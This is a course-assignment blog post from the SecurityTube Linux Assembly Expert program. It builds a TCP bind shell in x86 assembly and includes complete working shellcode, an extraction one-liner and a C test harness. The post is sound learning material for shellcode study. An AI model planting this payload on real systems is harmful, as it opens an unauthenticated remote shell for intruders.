---
title: "SLAE Assignment 1"
date: 2018-02-02
categories: securitytube slae linux assembly
published: true
---

### SecurityTube Linux Assembly Expert (SLAE) Course Exercises

[GitHub code repo](https://github.com/wsummerhill/SLAE)

Assignment 1 of the SLAE requires students to create a TCP bind shell in assembly which binds to a port and executes a shell on an incoming connection. Additionally, the port number should be configurable upon execution.

If I break down the functions required for a TCP bind shell in a basic C program, the functions used would be as follows:

1. socketCall
2. bind
3. listen
4. dup2 (x3)
5. execve

I used an online resource to determine the registers and function parameters of each system call above. Each function is separated in the below assembly and executed one at a time until the final execve call is executed.

The networking socket functions can be found with cat /usr/include/linux/net.h which will tell us the call identifier used in the socketcall function since they are different for each operation.

Putting everything together I got the assembly code below.

```
;Author: Will Summerhill
;Create shell_bind_tcp shellcode
;bind to a port - accept as input
;exec shell on incoming connections

;cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket - socketcall = 102 (hex 0x66)
;cat /usr/include/i386-linux-gnu/bits/socket_type.h |grep 'SOCK_STREAM'
;Function socket(domain, type, protocol)
;    (AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0)
;    (EAX, EBX, ECX)

global _start

section .text
_start:

; SocketCall function:
  xor  eax, eax    ;AF_INET = 2
  mov al, 0x02

  xor ebx, ebx    ;EBX: SOCK_STREAM = 1
  mov bl, 0x01

  xor edx, edx    ;EDX: IPPROTO_IP = 0
   
  push edx                ; TCP = 0
  push ebx                ; SOCK_STREAM = 1 
  push eax                ; AF_INET = 2 

  xor ecx, ecx
  mov ecx, esp    ;save stack into ECX

  xor eax, eax
  mov al, 0x66    ;socketcall syscall = 0x66 hex (102 decimal)
  int 0x80    ;execute

  mov edx, eax    ;EDX = sockfd output

; Bind function:
  ;int bind(int sockfd, const struct sockaddr *addr(), socklen_t addrlen)
  
  ;Push *addr() first onto stack
  ;*addr(addr family = AF_INET [2], port [1234], IP addr = INADDR_ANY [0])
  xor ebx, ebx
  push ebx    ;INADDR_ANY = 0
  push word 0xd204  ;PORT: bind port = 1234 in reverse order (0x04d2)  
  push word 2    ;AF_INET = 2
  mov ecx, esp    ;save stack into ECX
  
  ;Now push whole bind() function onto stack in reverse order
  push 0x10    ;addrlen size
  push ecx    ;*addr function
  push edx    ;sockfd = socket from Socketcall function above

  ;call syscall to execute
  xor eax, eax
  mov al, 0x66    ;socketcall syscall = 0x66 hex (102 decimal)
  mov bl, 0x02    ;socketcall type = sys_bind 2
  
  mov ecx, esp    ;move to ECX for execution
  int 0x80    ;execute BIND

; Listen function:
  ;int listen(int sockfd = SOCK_STREAM, int backlog = 1)
  ;Push in reverse order to stack
  push 0x01  ;backlog
  push edx  ;sockfd = Socket from above
  
  xor eax, eax
  xor ebx, ebx
  mov al, 0x66  ;syscall = 0x66 hex (102 decimal)
  mov bl, 0x04  ;socketcall type = SYS_LISTEN
  
  mov ecx, esp
  int 0x80  ;execute syscall

; Accept function:
  ;accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
  ;  sockfd = listening socket created above
  ;  *addr = pointer to a sockaddr structure = NULL
  ;  addrlen = size of *addr = NULL
  
  xor eax, eax  ;clear registers
  xor ebx, ebx

  ; Push in reverse order
  push eax  ;addrlen = NULL
  push eax  ;*addr = NULL
  push edx  ;sockfd = created socket
  mov ecx, esp  ;move function from stack into ECX

  mov al, 0x66  ;syscall to execute
  mov bl, 0x05  ;socketcall type = SYS_ACCEPT 5

  int 0x80  ;execute LISTEN
  mov edx, eax  ;save returned sockfd into old socket

; Dup2 functions:
  ;dup2(int oldfd, newfd)  [syscall 63 (0x3f)]
  ;  EAX = 0x3f (63 decimal)
  ;  EBX = oldfd
  ;  ECX = newfd
  xor eax, eax
  mov al, 0x3f  ;dup2 syscall number (3f hex, 63 decimal)
  
  ;STDIN = 0
  mov ebx, edx  ;oldfd into EBX
  xor ecx, ecx  ;STDIN = 0
  int 0x80  ;execute dup2(oldfd = ebx, newfd = STDIN)

  ;STDOUT = 1
  xor eax, eax
  mov al, 0x3f  ;dup2 function
  mov ebx, edx  ;oldfd into EBX
  inc ecx    ;STDOUT = 1
  int 0x80  ;execute dup2(oldfd = ebx,  newfd = STDOUT)

  ;STDERR = 2
  xor eax, eax
  mov al, 0x3f  ;dup2 function
  mov ebx, edx
  inc ecx    ;STDERR = 2
  int 0x80  ;execute dup2(oldfd = ebx, newfd = STDERR)

; Execve function to execute //bin/sh
  ;execve(filename, argv[], envp[])
  ;  EBX = //bin/sh 0x0
  ;  ECX = address of //bin/sh
  ;  EDX = 0x000000
  
  ;Push contents in reverse order
  xor eax, eax
  push eax

  ; PUSH //bin/sh (8 bytes) in reverse order
  push 0x68732f2f    ;n/sh
  push 0x6e69622f    ;//bi
  mov ebx, esp    ;move into EBX 

  push eax  ;add 0 to stack
  push ebx  ;push address of //bin/sh to stack
  mov ecx, esp
  push eax  ;null terminator after //bin/sh
  mov edx, esp

  mov al, 0xb  ;execve syscall = 11
  int 0x80  ;execute EXECVE to start bind shell
```

It is possible to configure the bind port number as needed by modifying the shellcode in ASM at the line with “;PORT: bind port = 1234” by adding a different port number in big-endian format. 

I’ll use objdump to pull the shellcode from the program and copy it over to C.  
```
objdump -d ./A1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

Now I’ll copy the shellcode into C so we can execute it. 

```
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x02\x31\xdb\xb3\x01\x31\xd2\x52\x53\x50\x31\xc9\x89\xe1\x31\xc0\xb0\x66\xcd\x80\x89\xc2\x31\xdb\x53\x66\x68\x04\xd2\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x31\xc0\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x6a\x01\x52\x31\xc0\x31\xdb\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x50\x50\x52\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x89\xc2\x31\xc0\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\x41\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";

main()
{
  printf("Shellcode Length:  %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
```

Once we compile it the bind shell should listen for incoming connections. After executing the program and connecting using netcat, we get the bind shell on localhost.  

![image](https://user-images.githubusercontent.com/35749735/192896487-de82cef1-22eb-49d8-9fcf-c509dbfcdf12.png)

The assembly code can also be found here on my [Github](https://github.com/wsummerhill/SLAE/blob/master/Assignment%201).

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: SLAE-1109
